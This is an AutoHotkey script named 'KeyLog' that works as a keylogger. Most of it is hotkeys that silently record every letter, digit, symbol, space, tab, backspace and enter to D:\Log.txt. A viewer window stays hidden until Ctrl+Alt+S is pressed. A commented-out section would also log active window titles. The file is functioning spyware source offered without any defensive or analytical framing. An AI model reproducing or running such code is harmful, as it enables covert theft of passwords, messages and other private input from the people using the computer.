#NoEnv ; Recommended for performance and compatibility with future #Persistent
#SingleInstance Force

logintervolts = 600000
FormatTime, date, YYYYMMDDHH12MISS
oldtitle=nothing
Gui, Add, Text, Center, -----------------------------------------------------------------------------------------KeyLog----------------------------------------------------------------------------------------
Gui, Add, Edit, x10 y30 w600 R40 vedit vtext,
Gui, Add, Button, x260 y580 w100, Exit
Gui, Add, Button, x360 y580 w100, Refresh
Gui, Add, Button, x160 y580 w100, Clear
Gui, Add, Button, x360 y610 w100, Remove All Logs
Gui, Add, Button, x160 y610 w100, Log Location

;SetTimer, timedate, %logintervolts%
;SetTimer, timerenew, 60000

SendMode Input

; Detect hidden windows since they can be active
; (e.g. AutoHotkey main window while using Menu,MenuName,Show.)
/*DetectHiddenWindows, On
Loop,
{
 WinGetActiveTitle, watitle
 if (watitle != oldtitle and watitle != "")
  {
  FileAppend, `n`n-------- %watitle% --------`n%date%`n, D:\Log.txt
  oldtitle = %watitle%
  }
}
*/

Return

ButtonLogLocation:
{
Gui, 3:Add, Text,, Your Log is at D:\Log.txt
Gui, 3:Add, Button,, Open Log
Gui, 3:Add, Button,, Ok
Gui, 3:Show
Return,
}

3ButtonOpenLog:
{
Gui, 3:Destroy
Run, %wheretosave%
Return,
}

3ButtonOk:
{
Gui, 3:Destroy
Return,
}

ButtonRemoveAllLogs:
{
FileDelete, D:\Log.txt
ExitApp
}

ButtonRefresh:
{
FileAppend, {Reload}, D:\Log.txt
FileRead, keylogedtext, D:\Log.txt
GuiControl,, text, %keylogedtext%
Return,
}

ButtonClear:
{
FileDelete, D:\Log.txt
FileAppend,, D:\Log.txt
FileRead, keylogedtext, D:\Log.txt
GuiControl,, text, %keylogedtext%
Return,
}

~a::fileappend, a, D:\Log.txt
   
~b::fileappend, b, D:\Log.txt

~c::fileappend, c, D:\Log.txt

~d::fileappend, d, D:\Log.txt

~e::fileappend, e, D:\Log.txt

~f::fileappend, f, D:\Log.txt

~g::fileappend, g, D:\Log.txt

~h::fileappend, h, D:\Log.txt

~i::fileappend, i, D:\Log.txt

~j::fileappend, j, D:\Log.txt

~k::fileappend, k, D:\Log.txt

~l::fileappend, l, D:\Log.txt

~m::fileappend, m, D:\Log.txt

~n::fileappend, n, D:\Log.txt

~o::fileappend, o, D:\Log.txt

~p::fileappend, p, D:\Log.txt

~q::fileappend, q, D:\Log.txt

~r::fileappend, r, D:\Log.txt

~s::fileappend, s, D:\Log.txt

~t::fileappend, t, D:\Log.txt

~u::fileappend, u, D:\Log.txt

~v::fileappend, v, D:\Log.txt

~w::fileappend, w, D:\Log.txt

~x::fileappend, x, D:\Log.txt

~y::fileappend, y, D:\Log.txt

~z::fileappend, z, D:\Log.txt

~+A::fileappend, A, D:\Log.txt

~+B::fileappend, B, D:\Log.txt

~+C::fileappend, C, D:\Log.txt

~+D::fileappend, D, D:\Log.txt

~+E::fileappend, E, D:\Log.txt

~+F::fileappend, F, D:\Log.txt

~+G::fileappend, G, D:\Log.txt

~+H::fileappend, H, D:\Log.txt

~+I::fileappend, I, D:\Log.txt

~+J::fileappend, J, D:\Log.txt

~+K::fileappend, K, D:\Log.txt

~+L::fileappend, L, D:\Log.txt

~+M::fileappend, M, D:\Log.txt

~+N::fileappend, N, D:\Log.txt

~+O::fileappend, O, D:\Log.txt

~+P::fileappend, P, D:\Log.txt

~+Q::fileappend, Q, D:\Log.txt

~+R::fileappend, R, D:\Log.txt

~+S::fileappend, S, D:\Log.txt

~+T::fileappend, T, D:\Log.txt

~+U::fileappend, U, D:\Log.txt

~+V::fileappend, V, D:\Log.txt

~+W::fileappend, W, D:\Log.txt

~+X::fileappend, X, D:\Log.txt

~+Y::fileappend, Y, D:\Log.txt

~+Z::fileappend, Z, D:\Log.txt
   
~`::fileappend, `, D:\Log.txt

~!::fileappend, !, D:\Log.txt

~@::fileappend, @, D:\Log.txt

~#::fileappend, #, D:\Log.txt

~$::fileappend, $, D:\Log.txt

~^::fileappend, ^, D:\Log.txt

~&::fileappend, &, D:\Log.txt

~*::fileappend, *, D:\Log.txt

~(::fileappend, (, D:\Log.txt

~)::fileappend, ), D:\Log.txt

~-::fileappend, -, D:\Log.txt

~_::fileappend, _, D:\Log.txt

~=::fileappend, =, D:\Log.txt

~+::fileappend, +, D:\Log.txt

~[::fileappend, [, D:\Log.txt

~{::fileappend, {, D:\Log.txt

~]::fileappend, ], D:\Log.txt

~}::fileappend, }, D:\Log.txt

~\::fileappend, \, D:\Log.txt

~|::fileappend, |, D:\Log.txt

~;::fileappend, `;, D:\Log.txt

~'::fileappend, ', D:\Log.txt

~<::fileappend, <, D:\Log.txt

~.::fileappend, ., D:\Log.txt

~>::fileappend, >, D:\Log.txt

~/::fileappend, /, D:\Log.txt

~?::fileappend, ?, D:\Log.txt

~enter::
{
fileappend, `n, D:\Log.txt
FileRead, keylogedtext, D:\Log.txt
GuiControl,, text, %keylogedtext%
return,
}

~space::fileappend, %A_space%, D:\Log.txt

~tab::fileappend, {tab}, D:\Log.txt

~CapsLock::fileappend, {caps}, D:\Log.txt

~backspace::fileappend, {<-}, D:\Log.txt

;~Control::fileappend, {Ctr}, D:\Log.txt

;~Alt::fileappend, {Alt}, D:\Log.txt

~1::fileappend, 1, D:\Log.txt

~2::fileappend, 2, D:\Log.txt

~3::fileappend, 3, D:\Log.txt

~4::fileappend, 4, D:\Log.txt

~5::fileappend, 5, D:\Log.txt

~6::fileappend, 6, D:\Log.txt

~7::fileappend, 7, D:\Log.txt

~8::fileappend, 8, D:\Log.txt

~9::fileappend, 9, D:\Log.txt

~0::fileappend, 0, D:\Log.txt

~NumPad1::fileappend, 1, D:\Log.txt

~NumPad2::fileappend, 2, D:\Log.txt

~NumPad3::fileappend, 3, D:\Log.txt

~NumPad4::fileappend, 4, D:\Log.txt

~NumPad5::fileappend, 5, D:\Log.txt

~NumPad6::fileappend, 6, D:\Log.txt

~NumPad7::fileappend, 7, D:\Log.txt

~NumPad8::fileappend, 8, D:\Log.txt

~NumPad9::fileappend, 9, D:\Log.txt

~NumPad0::fileappend, 0, D:\Log.txt

^!s::
	IfWinNotExist, KeyLog
	FileRead, keylogedtext, D:\Log.txt
	GuiControl,, text, %keylogedtext%
	Gui, Show,, KeyLog
Return

timedate:
{
FileAppend, `n%date%`n, D:\Log.txt
Return,
}

ButtonExit:
ExitApp

timerenew:
{
FormatTime, date, YYYYMMDDHH12MISS
}
Return,